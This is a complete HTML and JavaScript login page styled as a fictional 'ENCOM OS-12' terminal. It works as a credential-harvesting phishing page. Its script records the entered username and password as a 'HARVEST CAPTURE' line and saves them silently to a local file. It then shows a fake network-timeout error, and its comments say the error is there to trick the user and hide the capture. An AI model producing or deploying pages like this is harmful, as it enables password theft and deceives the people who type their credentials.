<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ENCOM OS-12 Login</title>
    <style>
        body { background-color: #000; color: #00ffcc; font-family: monospace; padding: 50px; }
        .login-box { border: 2px solid #00ffcc; padding: 20px; width: 300px; margin: 0 auto; box-shadow: 0 0 15px #00ffcc; }
        input[type="text"], input[type="password"] { width: 100%; margin-bottom: 10px; background: #111; color: #fff; border: 1px solid #00ffcc; padding: 5px; box-sizing: border-box; }
        input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
        .error-msg { color: #ff3333; margin-top: 15px; text-align: center; font-size: 0.9em; display: none; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Grid Node Authentication</h2>
    <form id="loginForm">
        <label for="username">Username:</label>
        <input type="text" id="username" required autocomplete="off">
        
        <label for="password">Password:</label>
        <input type="password" id="password" required>
        
        <input type="submit" value="ESTABLISH HANDSHAKE">
    </form>
    <div id="error" class="error-msg">CRITICAL LINK ERROR: Connection timeout to terminal node. Please try again.</div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Stop normal form processing
    
    var user = document.getElementById('username').value;
    var pass = document.getElementById('password').value;
    
    // Format the captured parameters to match your original playbook output exactly
    var logText = "[HARVEST CAPTURE] USER: " + user + " | PASS: " + pass + "\n";
    
    // Convert text data into a safe Base64 string for a local Data URI download
    var encodedUri = 'data:text/plain;base64,' + btoa(logText);
    
    // Create the download element in memory
    var downloadLink = document.createElement("a");
    downloadLink.setAttribute("href", encodedUri);
    downloadLink.setAttribute("download", "encom_session_debug.txt");
    
    // Append to body to ensure compatibility with older rendering engines
    document.body.appendChild(downloadLink);
    
    // Trigger the file saving mechanism locally
    downloadLink.click();
    
    // Clean up the DOM element
    document.body.removeChild(downloadLink);
    
    // Instead of redirecting away (which cancels the download), show a fake error message.
    // This tricks the user into thinking the network failed, hiding the file drop.
    document.getElementById('error').style.display = 'block';
});
</script>

</body>
</html>
